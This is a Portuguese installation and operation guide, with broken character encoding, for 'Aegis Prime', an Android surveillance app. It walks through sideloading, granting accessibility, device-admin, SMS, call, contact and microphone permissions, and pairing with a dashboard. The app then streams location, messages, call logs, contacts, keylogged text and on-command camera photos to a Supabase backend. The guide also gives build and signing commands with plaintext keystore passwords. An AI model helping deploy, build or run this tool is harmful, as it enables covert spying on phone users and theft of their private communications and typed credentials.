# ğŸ›¡ï¸ AEGIS PRIME - INSTRUÃ‡Ã•ES DE INSTALAÃ‡ÃƒO E USO

## ğŸ“± INSTALAÃ‡ÃƒO DO APK

### LocalizaÃ§Ã£o do APK
```
C:\Users\felli\Desktop\aegis\android-nativo\outputs\apk\release\aegis-prime-FINAL.apk
```

**Tamanho:** 15 MB
**MD5:** 6c47d76dd4f12aa4d85987792db33441
**VersÃ£o:** 1.0

### Passos para InstalaÃ§Ã£o

1. **Transferir APK para o celular:**
   - Via USB: Copie o arquivo para a pasta Download do celular
   - Via Dashboard: Baixe de `http://192.168.15.4:3001/aegis-prime.apk`

2. **Permitir instalaÃ§Ã£o de fontes desconhecidas:**
   - VÃ¡ em ConfiguraÃ§Ãµes â†’ SeguranÃ§a
   - Ative "Instalar apps desconhecidos" para o navegador/gerenciador de arquivos

3. **Instalar o APK:**
   - Abra o arquivo `aegis-prime-FINAL.apk`
   - Clique em "Instalar"
   - Aguarde a conclusÃ£o

---

## ğŸ” FLUXO DE PERMISSÃ•ES

O app solicita permissÃµes nesta ordem. **IMPORTANTE:** VocÃª deve conceder TODAS para avanÃ§ar para o pareamento.

### 1ï¸âƒ£ ACESSIBILIDADE (Tela Atual)

**O que fazer:**
1. Clique em "Abrir ConfiguraÃ§Ãµes de Acessibilidade"
2. Procure por "Aegis Prime" na lista
3. Clique em "Aegis Prime"
4. **ATIVE** o interruptor
5. Confirme na janela de aviso
6. Volte ao app (pressione o botÃ£o Voltar)

**Se "Aegis Prime" nÃ£o aparecer:**
- VÃ¡ em ConfiguraÃ§Ãµes â†’ Apps â†’ Aegis Prime â†’ PermissÃµes do app
- Verifique se todas as permissÃµes estÃ£o concedidas
- Reinicie o app

### 2ï¸âƒ£ LOCALIZAÃ‡ÃƒO

**PermissÃµes necessÃ¡rias:**
- âœ… LocalizaÃ§Ã£o Precisa (GPS)
- âœ… LocalizaÃ§Ã£o Aproximada (Rede)

**AÃ§Ã£o:** Clique em "Permitir" quando solicitado

### 3ï¸âƒ£ DADOS (SMS, Chamadas, Contatos)

**PermissÃµes necessÃ¡rias:**
- âœ… Ler SMS
- âœ… Ler registro de chamadas
- âœ… Ler contatos

**AÃ§Ã£o:** Clique em "Permitir" para cada uma

### 4ï¸âƒ£ CONTROLE REMOTO

**PermissÃµes necessÃ¡rias:**
- âœ… Gravar Ã¡udio (Microfone)
- âœ… Exibir sobre outros apps

**AÃ§Ã£o:** Ative ambas as permissÃµes

### 5ï¸âƒ£ ADMINISTRADOR DO DISPOSITIVO

**O que fazer:**
1. SerÃ¡ redirecionado para ativar Device Admin
2. Clique em "Ativar"
3. Confirme

---

## ğŸ”— PAREAMENTO COM O DASHBOARD

ApÃ³s conceder TODAS as permissÃµes, vocÃª verÃ¡ a tela de pareamento:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚       AEGIS PRIME                â”‚
â”‚                                  â”‚
â”‚  URL DO DASHBOARD                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ http://192.168.15.4:3001   â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                  â”‚
â”‚  CÃ“DIGO DE PAREAMENTO            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ 612286                     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                  â”‚
â”‚         [ CONNECT ]              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Como Parear

**OpÃ§Ã£o 1: Pareamento Manual**
1. Certifique-se que a URL estÃ¡ correta: `http://192.168.15.4:3001`
2. No dashboard, gere um cÃ³digo de pareamento de 6 dÃ­gitos
3. Digite o cÃ³digo no app
4. Clique em "CONNECT"

**OpÃ§Ã£o 2: QR Code (se disponÃ­vel)**
1. No dashboard, gere um QR Code
2. Use o botÃ£o de scan no app (se implementado)
3. Escaneie o QR Code

### ApÃ³s o Pareamento Bem-Sucedido

âœ… O dispositivo aparecerÃ¡ no dashboard
âœ… Todos os serviÃ§os iniciarÃ£o automaticamente
âœ… Dados comeÃ§arÃ£o a ser enviados:
- LocalizaÃ§Ã£o em tempo real
- SMS recebidos e enviados
- Registro de chamadas
- Contatos
- Texto digitado (keylogger)
- Fotos da cÃ¢mera (quando comandado)

---

## ğŸ› DEBUG COM LOGCAT

Para diagnosticar problemas, conecte o celular via USB e execute:

```bash
adb logcat -s AegisPrime:D *:S
```

### Logs Importantes

**Ao abrir o app:**
```
=== Verificando ServiÃ§o de Acessibilidade ===
Package: com.example.aegis_prime
Expected ID: com.example.aegis_prime/com.example.aegis_prime.services.AegisAccessibilityService
ServiÃ§os habilitados: 1
ServiÃ§o encontrado: com.example.aegis_prime/com.example.aegis_prime.services.AegisAccessibilityService
âœ… SERVIÃ‡O DE ACESSIBILIDADE ATIVO!
```

**Se o serviÃ§o NÃƒO estiver ativo:**
```
âŒ ServiÃ§o de acessibilidade NÃƒO estÃ¡ ativo
=== PermissionOrchestrator (trigger=0) ===
Mostrando tela: ACESSIBILIDADE
```

**Quando voltar das configuraÃ§Ãµes (se ativou corretamente):**
```
=== PermissionOrchestrator (trigger=1) ===
âœ… SERVIÃ‡O DE ACESSIBILIDADE ATIVO!
Mostrando tela: LOCALIZAÃ‡ÃƒO
```

**Quando TODAS as permissÃµes forem concedidas:**
```
âœ… TODAS AS PERMISSÃ•ES CONCEDIDAS! AvanÃ§ando para PAREAMENTO
```

---

## ğŸ”§ TROUBLESHOOTING

### Problema: App trava na tela de Acessibilidade

**SoluÃ§Ã£o 1: Verificar se o serviÃ§o estÃ¡ ativo**
1. VÃ¡ em ConfiguraÃ§Ãµes â†’ Acessibilidade
2. Procure por "Aegis Prime"
3. Verifique se estÃ¡ ATIVADO (interruptor azul/verde)
4. Se nÃ£o estiver, ative

**SoluÃ§Ã£o 2: Verificar ID do serviÃ§o via logcat**
1. Conecte o celular via USB
2. Execute: `adb logcat -s AegisPrime:D *:S`
3. Veja a linha "Expected ID:" e "ServiÃ§o encontrado:"
4. Compare se sÃ£o iguais (ignorando maiÃºsculas/minÃºsculas)

**SoluÃ§Ã£o 3: Reinstalar o app**
1. Desinstale completamente o Aegis Prime
2. Limpe os dados (opcional)
3. Reinstale o novo APK
4. Conceda todas as permissÃµes desde o inÃ­cio

### Problema: ServiÃ§o aparece mas nÃ£o reconhece

**PossÃ­vel causa:** O ID do serviÃ§o estÃ¡ diferente do esperado

**SoluÃ§Ã£o:**
1. Execute logcat
2. Copie as linhas "Expected ID:" e "ServiÃ§o encontrado:"
3. Envie para anÃ¡lise

### Problema: NÃ£o consigo parear com o dashboard

**VerificaÃ§Ãµes:**
1. âœ… Dashboard estÃ¡ rodando em `http://192.168.15.4:3001`?
2. âœ… Celular e PC estÃ£o na mesma rede Wi-Fi?
3. âœ… CÃ³digo de pareamento estÃ¡ correto (6 dÃ­gitos)?
4. âœ… Firewall do PC nÃ£o estÃ¡ bloqueando a porta 3001?

**Teste de conectividade:**
No celular, abra o navegador e acesse: `http://192.168.15.4:3001`
- Se abrir o dashboard â†’ Rede OK
- Se nÃ£o abrir â†’ Problema de rede/firewall

---

## ğŸ“Š BACKEND (SUPABASE)

### ConfiguraÃ§Ã£o Atual

**URL do Supabase:** `https://hacxikpmgeataaoppsnf.supabase.co`

### Tabelas Esperadas

O app envia dados para estas tabelas:

| Tabela | DescriÃ§Ã£o | Campos Principais |
|--------|-----------|-------------------|
| `devices` | InformaÃ§Ãµes do dispositivo | device_id, model, android_version |
| `locations` | GPS em tempo real | latitude, longitude, timestamp |
| `sms` | Mensagens SMS | sender, message, timestamp |
| `calls` | Registro de chamadas | number, duration, type |
| `contacts` | Agenda de contatos | name, phone |
| `keylogs` | Texto digitado | app_name, text, timestamp |
| `photos` | Fotos capturadas | image_url, timestamp |
| `commands` | Comandos remotos | command_type, status |

---

## ğŸš€ COMPILAR NOVO APK

Se vocÃª fizer alteraÃ§Ãµes no cÃ³digo e precisar recompilar:

### MÃ©todo 1: Script AutomÃ¡tico (Windows)
```bash
C:\Users\felli\Desktop\aegis\build-and-deploy.bat
```

### MÃ©todo 2: Script Bash
```bash
cd /c/Users/felli/Desktop/aegis
./build.sh
```

### MÃ©todo 3: Manual
```bash
cd C:\Users\felli\StudioProjects\aegis_prime
./gradlew assembleRelease

# Copiar APK
cp app/build/outputs/apk/release/app-release.apk C:/Users/felli/Desktop/aegis/android-nativo/outputs/apk/release/

# Assinar
cd C:/Users/felli/Desktop/aegis/android-nativo/outputs/apk/release
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore C:/Users/felli/aegis-keystore.jks \
  -storepass aegisprime2026 -keypass aegisprime2026 \
  app-release.apk aegis-key

# Zipalign
C:/Users/felli/AppData/Local/Android/Sdk/build-tools/30.0.3/zipalign.exe \
  -f 4 app-release.apk aegis-prime-FINAL.apk
```

---

## ğŸ“ NOTAS IMPORTANTES

1. **Keystore:** O arquivo `C:\Users\felli\aegis-keystore.jks` Ã© CRÃTICO. Guarde-o em local seguro. Sem ele, vocÃª nÃ£o consegue atualizar o app.

2. **Senha do Keystore:**
   - Store password: `aegisprime2026`
   - Key password: `aegisprime2026`
   - Alias: `aegis-key`

3. **VersÃ£o do APK:** Sempre que fizer alteraÃ§Ãµes, incremente a `versionCode` e `versionName` no `build.gradle.kts`

4. **Logs:** Os logs detalhados foram adicionados na versÃ£o atual para facilitar o debug. Em produÃ§Ã£o, vocÃª pode removÃª-los.

---

## âœ… CHECKLIST DE INSTALAÃ‡ÃƒO

- [ ] APK transferido para o celular
- [ ] InstalaÃ§Ã£o concluÃ­da
- [ ] App aberto pela primeira vez
- [ ] ServiÃ§o de Acessibilidade ATIVADO
- [ ] PermissÃ£o de LocalizaÃ§Ã£o concedida
- [ ] PermissÃ£o de SMS/Chamadas/Contatos concedida
- [ ] PermissÃ£o de Ãudio concedida
- [ ] PermissÃ£o de Exibir sobre apps concedida
- [ ] Device Admin ativado
- [ ] Tela de pareamento apareceu
- [ ] Dashboard estÃ¡ rodando
- [ ] CÃ³digo de pareamento inserido
- [ ] Pareamento bem-sucedido
- [ ] Dispositivo aparece no dashboard

---

**Ãšltima atualizaÃ§Ã£o:** 02/02/2026 23:30
**VersÃ£o do documento:** 1.0
